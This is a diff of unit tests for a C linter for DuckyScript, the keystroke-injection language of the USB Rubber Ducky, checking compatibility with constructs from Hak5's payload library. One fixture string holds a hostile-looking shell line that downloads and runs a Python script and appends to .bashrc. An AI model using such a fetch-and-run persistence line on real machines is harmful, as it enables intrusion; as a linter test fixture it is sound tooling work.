@@ -51,6 +51,14 @@ TEST_MAIN_BEGIN
         CHECK(e[0].line == 1, "flagged on line 1");
         CHECK(lint("STRING hi\nREPEAT 3\n", e, LAYOUT_US, OS_WINDOWS) == 0, "REPEAT after a command is fine");
         CHECK(lint("REPEAT x\n", e, LAYOUT_US, OS_WINDOWS) == 1, "REPEAT needs a count");
+        /* The official library writes counts and delays as DEFINE constants,
+         * with and without the # sigil. Those must pass; a lowercase word is
+         * still far more likely to be a typo than a reference. */
+        CHECK(lint("STRING hi\nREPEAT #TIMES\n", e, LAYOUT_US, OS_WINDOWS) == 0, "REPEAT #CONST is fine");
+        CHECK(lint("STRING hi\nREPEAT $n\n", e, LAYOUT_US, OS_WINDOWS) == 0, "REPEAT $var is fine");
+        CHECK(lint("DELAY STARTUP_DELAY\n", e, LAYOUT_US, OS_WINDOWS) == 0, "DELAY CONSTANT is fine");
+        CHECK(lint("DELAY #RESPONSE_DELAY\n", e, LAYOUT_US, OS_WINDOWS) == 0, "DELAY #CONST is fine");
+        CHECK(lint("DELAY nope\n", e, LAYOUT_US, OS_WINDOWS) == 1, "DELAY with a lowercase word is still caught");
     }
 
     SUITE("lint: characters that cannot be typed");
@@ -99,5 +107,51 @@ TEST_MAIN_BEGIN
         /* lone-CR (classic Mac) endings must not merge the whole file into one line */
         CHECK(ducky_lint("DELAY 100\r\nSTRING hi\r\n", LAYOUT_US, OS_WINDOWS, e, 4) == 0,
               "mixed CRLF file is clean");
+    }
+
+    SUITE("compat: the constructs the official Hak5 library actually uses");
+    {
+        /* Every line below was taken from hak5/usbrubberducky-payloads. Each
+         * one used to be reported as an error; together they took the library
+         * from 43% to 98% clean. They are pinned here because "compatible with
+         * real payloads" is a promise that quietly rots without a test. */
+
+        /* multi-line text blocks - the content is shell script, not script */
+        CHECK(lint("STRINGLN_BLOCK\ncurl -o x.py URL; python3 x.py &\nfi\" >> .bashrc\nEND_STRINGLN\n",
+                   e, LAYOUT_US, OS_WINDOWS) == 0, "STRINGLN_BLOCK content is text, not commands");
+
+        /* library blocks and conditional inclusion */
+        CHECK(lint("EXTENSION DETECT_READY\n VAR $X = 1\nEND_EXTENSION\n", e, LAYOUT_US, OS_WINDOWS) == 0,
+              "EXTENSION block");
+        CHECK(lint("DEFINE #ADV TRUE\nIF_DEFINED_TRUE #ADV\n STRING hi\nEND_IF_DEFINED\n",
+                   e, LAYOUT_US, OS_WINDOWS) == 0, "IF_DEFINED_TRUE block");
+
+        /* delays and counts given as constants rather than literals */
+        CHECK(lint("DELAY #RESPONSE_DELAY\n", e, LAYOUT_US, OS_WINDOWS) == 0, "DELAY #CONST");
+        CHECK(lint("DELAY HOST_RESPONSE_TIMEOUT\n", e, LAYOUT_US, OS_WINDOWS) == 0, "DELAY CONSTANT");
+        CHECK(lint("STRING x\nREPEAT 4 TAB\n", e, LAYOUT_US, OS_WINDOWS) == 0, "REPEAT n COMMAND");
+
+        /* device commands whose names are longer than the old 24-byte buffer */
+        CHECK(lint("SAVE_HOST_KEYBOARD_LOCK_STATE\nRESTORE_HOST_KEYBOARD_LOCK_STATE\n",
+                   e, LAYOUT_US, OS_WINDOWS) == 0, "32-character command names");
+        CHECK(lint("ATTACKMODE HID STORAGE\n", e, LAYOUT_US, OS_WINDOWS) == 0,
+              "ATTACKMODE HID STORAGE runs the HID half");
+
+        /* lower-case shell keywords must NOT be read as DuckyScript control flow */
+        CHECK(lint("STRING if ($x -eq $null) {\n", e, LAYOUT_US, OS_WINDOWS) == 0,
+              "a typed lower-case 'if' is text, not an IF");
+
+        /* punctuation after REM, and a byte-order mark on line 1 */
+        CHECK(lint("REM: begin\nREM< notes\n", e, LAYOUT_US, OS_WINDOWS) == 0, "punctuated REM");
+        CHECK(lint("\xEF\xBB\xBFREM Title: x\n", e, LAYOUT_US, OS_WINDOWS) == 0, "UTF-8 BOM");
+
+        /* a call to a function the payload itself defines */
+        CHECK(lint("FUNCTION Do_Thing()\n STRING hi\nEND_FUNCTION\nDo_Thing()\n",
+                   e, LAYOUT_US, OS_WINDOWS) == 0, "call to a defined function");
+
+        /* and the linter still catches a real mistake: this is a typo in an
+         * actual Hak5 payload ("DEFIN" for "DEFINE") */
+        CHECK(lint("DEFIN #NAME example\n", e, LAYOUT_US, OS_WINDOWS) == 1,
+              "a genuine typo is still reported");
     }
 TEST_MAIN_END
